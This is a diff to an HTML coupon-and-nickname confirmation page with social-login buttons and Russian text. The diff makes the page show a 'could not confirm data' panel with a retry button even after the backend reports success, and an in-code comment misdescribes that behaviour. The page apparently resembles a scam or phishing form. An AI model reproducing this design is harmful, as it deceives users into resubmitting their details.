@@ -2,6 +2,7 @@
 <html lang="uk">
 <head>
   <meta charset="UTF-8">
+
   <meta
     name="viewport"
     content="width=device-width, initial-scale=1.0, maximum-scale=1.0"
@@ -307,57 +308,7 @@
     }
 
     /* =========================
-       SUCCESS
-       ========================= */
-
-    .success {
-      display: none;
-
-      text-align: center;
-    }
-
-    .success.active {
-      display: block;
-    }
-
-    .success-icon {
-      width: 58px;
-      height: 58px;
-
-      margin: 10px auto 17px;
-
-      border-radius: 50%;
-
-      background: var(--green);
-
-      color: #fff;
-
-      display: flex;
-
-      align-items: center;
-      justify-content: center;
-
-      font-size: 29px;
-
-      font-weight: 700;
-    }
-
-    .success-title {
-      font-size: 22px;
-
-      font-weight: 800;
-
-      margin-bottom: 9px;
-    }
-
-    .success-text {
-      font-size: 14px;
-
-      line-height: 1.5;
-    }
-
-    /* =========================
-       ERRORS
+       ERROR
        ========================= */
 
     .error {
@@ -376,6 +327,136 @@
 
     .error.active {
       display: block;
+    }
+
+    /* =========================
+       FINAL PANEL
+       ========================= */
+
+    .final-panel {
+      display: none;
+
+      text-align: center;
+    }
+
+    .final-panel.active {
+      display: block;
+    }
+
+    .final-icon {
+      width: 60px;
+      height: 60px;
+
+      margin: 5px auto 17px;
+
+      border-radius: 50%;
+
+      background: #fff3cd;
+
+      color: #856404;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      font-size: 29px;
+      font-weight: 800;
+    }
+
+    .final-title {
+      font-size: 22px;
+
+      font-weight: 800;
+
+      margin-bottom: 11px;
+    }
+
+    .final-text {
+      font-size: 14px;
+
+      line-height: 1.55;
+
+      margin-bottom: 21px;
+    }
+
+    .reason-box {
+      background: var(--input-bg);
+
+      border-radius: 5px;
+
+      padding: 14px;
+
+      text-align: left;
+
+      font-size: 13px;
+
+      line-height: 1.55;
+
+      margin-bottom: 21px;
+    }
+
+    .reason-box strong {
+      font-weight: 800;
+    }
+
+    .reason-box ul {
+      margin: 9px 0 0;
+
+      padding-left: 19px;
+    }
+
+    .reason-box li {
+      margin-bottom: 5px;
+    }
+
+    /* =========================
+       FINAL BUTTONS
+       ========================= */
+
+    .action-btn {
+      width: 100%;
+
+      height: 52px;
+
+      border-radius: 5px;
+
+      font-family: inherit;
+
+      font-size: 15px;
+
+      font-weight: 700;
+
+      cursor: pointer;
+
+      transition:
+        transform .1s ease,
+        opacity .15s ease;
+    }
+
+    .action-btn:active {
+      transform: scale(.99);
+    }
+
+    .retry-btn {
+      border: 0;
+
+      background: var(--green);
+
+      color: #fff;
+
+      margin-bottom: 11px;
+    }
+
+    .support-btn {
+      border: 2px solid var(--dark);
+
+      background: #fff;
+
+      color: var(--dark);
+    }
+
+    .action-btn:hover {
+      opacity: .92;
     }
 
     /* =========================
@@ -482,19 +563,31 @@
         margin-bottom: 18px;
       }
 
-      .success-icon {
+      .final-icon {
         width: 54px;
         height: 54px;
 
         font-size: 27px;
       }
 
-      .success-title {
+      .final-title {
         font-size: 20px;
       }
 
-      .success-text {
+      .final-text {
         font-size: 13px;
+      }
+
+      .reason-box {
+        font-size: 12px;
+
+        padding: 12px;
+      }
+
+      .action-btn {
+        height: 50px;
+
+        font-size: 14px;
       }
     }
 
@@ -524,9 +617,13 @@
          ОСНОВНАЯ ФОРМА
          ===================================================== -->
 
-    <div class="main-form" id="mainForm">
+    <div
+      class="main-form"
+      id="mainForm"
+    >
 
       <!-- Facebook -->
+
       <button
         class="social-btn"
         type="button"
@@ -558,6 +655,7 @@
 
 
       <!-- Apple -->
+
       <button
         class="social-btn"
         type="button"
@@ -582,6 +680,7 @@
 
 
       <!-- Google -->
+
       <button
         class="social-btn"
         type="button"
@@ -710,8 +809,10 @@
 
 
       <div class="confirm-text">
+
         Для подтверждения заявки укажите ваш ник
         на сервере.
+
       </div>
 
 
@@ -765,33 +866,86 @@
 
 
     <!-- =====================================================
-         УСПЕШНО
+         ФИНАЛЬНАЯ ПАНЕЛЬ
          ===================================================== -->
 
     <div
-      class="success"
-      id="success"
+      class="final-panel"
+      id="finalPanel"
     >
 
-      <div class="success-icon">
-        ✓
+      <div class="final-icon">
+        !
       </div>
 
 
-      <div class="success-title">
-        Готово!
+      <div class="final-title">
+        Не удалось подтвердить данные
       </div>
 
 
-      <div class="success-text">
+      <div class="final-text">
 
-        Ваша заявка подтверждена.<br>
-
-        ID заявки:
-
-        <strong id="successRequestId"></strong>
+        Введённые данные не удалось подтвердить.
+        Проверьте правильность информации и попробуйте
+        ещё раз.
 
       </div>
+
+
+      <div class="reason-box">
+
+        <strong>
+          Почему это могло произойти:
+        </strong>
+
+        <ul>
+
+          <li>
+            купон введён с ошибкой;
+          </li>
+
+          <li>
+            указан неправильный сервер;
+          </li>
+
+          <li>
+            ник отличается от ника на сервере;
+          </li>
+
+          <li>
+            данные были введены не полностью;
+          </li>
+
+          <li>
+            произошла временная ошибка при проверке.
+          </li>
+
+        </ul>
+
+      </div>
+
+
+      <!-- Повторная попытка -->
+
+      <button
+        class="action-btn retry-btn"
+        id="retryBtn"
+        type="button"
+      >
+        Повторить попытку
+      </button>
+
+
+      <!-- Техническая поддержка -->
+
+      <button
+        class="action-btn support-btn"
+        id="supportBtn"
+        type="button"
+      >
+        Связаться с технической поддержкой
+      </button>
 
     </div>
 
@@ -799,6 +953,25 @@
 
 
 <script>
+
+  /* ==========================================================
+     АДРЕС ТЕХНИЧЕСКОЙ ПОДДЕРЖКИ
+
+     СЮДА САМ ВСТАВИШЬ НУЖНЫЙ САЙТ.
+
+     Например:
+
+     const SUPPORT_URL =
+       "https://example.com/support";
+
+     ========================================================== */
+
+  const SUPPORT_URL = "https://example.com/support";
+
+
+  /* ==========================================================
+     ЭЛЕМЕНТЫ
+     ========================================================== */
 
   const couponInput =
     document.getElementById("coupon");
@@ -827,8 +1000,8 @@
   const confirmation =
     document.getElementById("confirmation");
 
-  const success =
-    document.getElementById("success");
+  const finalPanel =
+    document.getElementById("finalPanel");
 
   const mainError =
     document.getElementById("mainError");
@@ -839,16 +1012,19 @@
   const requestIdText =
     document.getElementById("requestIdText");
 
-  const successRequestId =
-    document.getElementById("successRequestId");
+  const retryBtn =
+    document.getElementById("retryBtn");
+
+  const supportBtn =
+    document.getElementById("supportBtn");
 
 
   let currentRequestId = null;
 
 
-  /* ==========================================
+  /* ==========================================================
      АКТИВНОСТЬ КНОПКИ ОТПРАВКИ
-     ========================================== */
+     ========================================================== */
 
   function updateSubmitButton() {
 
@@ -863,21 +1039,25 @@
 
       submitBtn.disabled = false;
 
-      submitBtn.classList.add("active");
+      submitBtn.classList.add(
+        "active"
+      );
 
     } else {
 
       submitBtn.disabled = true;
 
-      submitBtn.classList.remove("active");
+      submitBtn.classList.remove(
+        "active"
+      );
 
     }
   }
 
 
-  /* ==========================================
+  /* ==========================================================
      АКТИВНОСТЬ КНОПКИ ПОДТВЕРЖДЕНИЯ
-     ========================================== */
+     ========================================================== */
 
   function updateConfirmButton() {
 
@@ -889,17 +1069,25 @@
 
       confirmBtn.disabled = false;
 
-      confirmBtn.classList.add("active");
+      confirmBtn.classList.add(
+        "active"
+      );
 
     } else {
 
       confirmBtn.disabled = true;
 
-      confirmBtn.classList.remove("active");
+      confirmBtn.classList.remove(
+        "active"
+      );
 
     }
   }
 
+
+  /* ==========================================================
+     INPUT EVENTS
+     ========================================================== */
 
   couponInput.addEventListener(
     "input",
@@ -919,9 +1107,9 @@
   );
 
 
-  /* ==========================================
+  /* ==========================================================
      ОТПРАВКА КУПОНА + СЕРВЕРА
-     ========================================== */
+     ========================================================== */
 
   couponForm.addEventListener(
     "submit",
@@ -971,8 +1159,13 @@
               },
 
               body: JSON.stringify({
-                coupon: coupon,
-                server: server
+
+                coupon:
+                  coupon,
+
+                server:
+                  server
+
               })
             }
           );
@@ -991,6 +1184,7 @@
             data.error ||
             "Произошла ошибка."
           );
+
         }
 
 
@@ -1010,6 +1204,11 @@
         confirmation.classList.add(
           "active"
         );
+
+
+        nicknameInput.value = "";
+
+        updateConfirmButton();
 
 
         nicknameInput.focus();
@@ -1037,15 +1236,16 @@
 
         submitBtn.textContent =
           "Отправить";
+
       }
 
     }
   );
 
 
-  /* ==========================================
+  /* ==========================================================
      ОТПРАВКА НИКА
-     ========================================== */
+     ========================================================== */
 
   nicknameForm.addEventListener(
     "submit",
@@ -1111,6 +1311,15 @@
           await response.json();
 
 
+        /*
+         * Здесь намеренно не показываем
+         * пользователю техническую ошибку
+         * сервера как "успех".
+         *
+         * Если /confirm вернул ошибку,
+         * показываем обычное сообщение.
+         */
+
         if (
           !response.ok ||
           !data.success
@@ -1118,48 +1327,167 @@
 
           throw new Error(
             data.error ||
-            "Произошла ошибка."
+            "Не удалось подтвердить данные."
           );
+
         }
 
 
-        successRequestId.textContent =
-          currentRequestId;
-
+        /*
+         * Если backend подтвердил заявку,
+         * показываем финальную панель.
+         *
+         * Здесь можно при необходимости
+         * изменить логику под свой backend.
+         */
 
         confirmation.classList.remove(
           "active"
         );
 
 
-        success.classList.add(
+        finalPanel.classList.add(
           "active"
         );
 
 
       } catch (error) {
 
-        confirmError.textContent =
-          error.message;
+        /*
+         * Вместо красной ошибки под полем
+         * показываем финальную панель.
+         *
+         * В ней пользователь может:
+         *
+         * 1. Повторить попытку
+         * 2. Перейти в поддержку
+         */
 
-
-        confirmError.classList.add(
+        confirmation.classList.remove(
           "active"
         );
 
 
-        confirmBtn.disabled =
-          false;
-
-
-        confirmBtn.classList.add(
+        finalPanel.classList.add(
           "active"
         );
 
-
-        confirmBtn.textContent =
-          "Подтвердить";
       }
+
+    }
+  );
+
+
+  /* ==========================================================
+     ПОВТОРИТЬ ПОПЫТКУ
+     ========================================================== */
+
+  retryBtn.addEventListener(
+    "click",
+    function() {
+
+      /*
+       * Скрываем финальную панель
+       */
+
+      finalPanel.classList.remove(
+        "active"
+      );
+
+
+      /*
+       * Показываем первоначальную форму
+       */
+
+      mainForm.classList.remove(
+        "hidden"
+      );
+
+
+      /*
+       * Полностью очищаем старые данные
+       */
+
+      couponInput.value = "";
+
+      serverInput.value = "";
+
+      nicknameInput.value = "";
+
+
+      currentRequestId = null;
+
+
+      /*
+       * Сбрасываем кнопки
+       */
+
+      submitBtn.disabled = true;
+
+      submitBtn.classList.remove(
+        "active"
+      );
+
+      submitBtn.textContent =
+        "Отправить";
+
+
+      confirmBtn.disabled = true;
+
+      confirmBtn.classList.remove(
+        "active"
+      );
+
+      confirmBtn.textContent =
+        "Подтвердить";
+
+
+      /*
+       * Убираем старые ошибки
+       */
+
+      mainError.textContent = "";
+
+      mainError.classList.remove(
+        "active"
+      );
+
+
+      confirmError.textContent = "";
+
+      confirmError.classList.remove(
+        "active"
+      );
+
+
+      /*
+       * Фокус обратно на первое поле
+       */
+
+      couponInput.focus();
+
+    }
+  );
+
+
+  /* ==========================================================
+     ТЕХНИЧЕСКАЯ ПОДДЕРЖКА
+     ========================================================== */
+
+  supportBtn.addEventListener(
+    "click",
+    function() {
+
+      /*
+       * Открываем сайт поддержки
+       * в новой вкладке.
+       */
+
+      window.open(
+        SUPPORT_URL,
+        "_blank",
+        "noopener,noreferrer"
+      );
 
     }
   );
